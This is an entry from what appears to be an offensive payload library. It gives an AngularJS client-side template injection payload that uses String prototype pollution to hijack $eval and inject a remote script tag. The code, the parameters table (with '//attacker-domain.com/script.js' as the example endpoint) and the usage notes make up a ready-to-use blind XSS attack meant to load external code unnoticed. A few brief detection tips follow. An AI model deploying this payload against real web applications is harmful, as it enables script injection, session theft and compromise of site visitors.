---
id: 5ab883f6-97ac-4e1d-a3b6-d39de64e7e81
type: code
language: JavaScript
verified: true
created_at: '2023-04-06T03:56:43.760399+00:00'
updated_at: '2023-04-10T20:24:53.221835+00:00'
tags:
  - CSTI
  - Blind XSS
  - Prototype Pollution
  - AngularJS
platforms:
  - Web
  - Browser
validated: true
---

# AngularJS-Eval-Prototype-Pollution-Script-Injection

## Code

```javascript
{{
    a="a"["constructor"].prototype;a.charAt=a.trim;
    $eval('a",eval(`var _=document\x2ecreateElement(\'script\');
    _\x2esrc=\'//localhost/m\';
    document\x2ebody\x2eappendChild(_);`),"')
}}
```

## Description

This advanced payload uses prototype pollution on the String object to override methods and hijack AngularJS's $eval function, allowing blind execution of code that injects a remote script. Effective against filtered constructor accesses.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| localhost/m | Remote payload endpoint | //attacker-domain.com/script.js |

## Usage

Inject into $eval-exposed templates. It pollutes prototypes to force eval of the script injection, loading external code without visual cues.

## Detection

- Prototype chain modifications detectable via Object.getPrototypeOf checks in monitoring scripts.
- $eval invocations with suspicious strings in browser console logs.
- Unexpected eval calls in CSP or script analysis tools.

## Related

- [[procedures/Client-Side-Template-Injection-using-Blind-XSS]]
